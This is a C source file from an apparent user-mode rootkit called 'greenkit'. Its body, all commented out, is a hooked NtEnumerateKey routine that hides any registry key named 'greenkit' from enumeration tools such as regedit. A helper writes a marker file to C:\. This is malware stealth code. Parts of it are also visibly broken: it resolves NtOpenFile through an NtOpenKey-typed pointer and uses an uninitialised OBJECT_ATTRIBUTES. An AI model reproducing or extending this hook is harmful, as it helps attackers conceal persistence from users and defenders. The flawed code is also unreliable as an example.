#include "stdafx.h"

#include "NtEnumerateKey.h"
#include <windows.h>
#include "hooking.h"
/*
VOID WriteFile2(char token)
{
    HANDLE hFile = CreateFile("C:\\greenkit.txt",                // name of the write
        GENERIC_WRITE,          // open for writing
        0,                      // do not share
        NULL,                   // default security
        CREATE_NEW,             // create new file only
        FILE_ATTRIBUTE_NORMAL,  // normal file
        NULL);                  // no attr. template

    DWORD dwBytesWritten = 0;
    char Str[] = "hook regedit";
    WriteFile(hFile, Str + token, strlen(Str + token), &dwBytesWritten, NULL);
}

BOOL mustShiftReg(UNICODE_STRING uStr_reg) {
	if (wcscmp((uStr_reg.Buffer), L"greenkit") <= 0)
		return TRUE;
	return FALSE;
}

BOOL mustHideReg(UNICODE_STRING uStr_reg) {
	if (wcscmp(uStr_reg.Buffer, L"greenkit") == 0)
		return TRUE;
	return FALSE;
}

PVOID getKeyName(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return (PVOID) &(((PKEY_BASIC_INFORMATION)KeyInformation)->Name);
	else if (KeyInformationClass == KeyNodeInformation)
		return (PVOID) &(((PKEY_NODE_INFORMATION)KeyInformation)->Name);
	return NULL;
}

ULONG getKeyNameLength(PVOID KeyInformation, KEY_INFORMATION_CLASS KeyInformationClass) {
	if (KeyInformationClass == KeyBasicInformation)
		return ((PKEY_BASIC_INFORMATION)KeyInformation)->NameLength;
	else if (KeyInformationClass == KeyNodeInformation)
		return ((PKEY_NODE_INFORMATION)KeyInformation)->NameLength;
	return 0;
}

NTSTATUS NTAPI NewNtEnumerateKey(
	HANDLE					KeyHandle,
	ULONG					Index,
	KEY_INFORMATION_CLASS	KeyInformationClass,
	PVOID					KeyInformation,
	ULONG					Length,
	PULONG					ResultLength)
{
	NTSTATUS ret;
	UNICODE_STRING uStr_tmp;
	ULONG tmpIndex;
	HANDLE h_tmp;
	OBJECT_ATTRIBUTES ObjectAttributes;
	ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

	if (!(KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation))
		return ret;
	else if (!NT_SUCCESS(ret))
		return ret;

	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	if (!mustShiftReg(uStr_tmp)) // TODO change this part for more than one key to hide
		return ret;
	else {
		TD_NtOpenKey _NtOpenFile = (TD_NtOpenKey) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
		if (!NT_SUCCESS(_NtOpenFile(&h_tmp, GENERIC_READ, &ObjectAttributes)))
			return ret;
	}

	CloseHandle(h_tmp);

	tmpIndex = Index + 1;
    ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
	if (ret != STATUS_SUCCESS)
		return ret;
	
	uStr_tmp.Buffer = (PWSTR) getKeyName(KeyInformation, KeyInformationClass);
	uStr_tmp.Length = (USHORT) getKeyNameLength(KeyInformation, KeyInformationClass);

	if (mustHideReg(uStr_tmp))
		++tmpIndex;

    return hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
}*/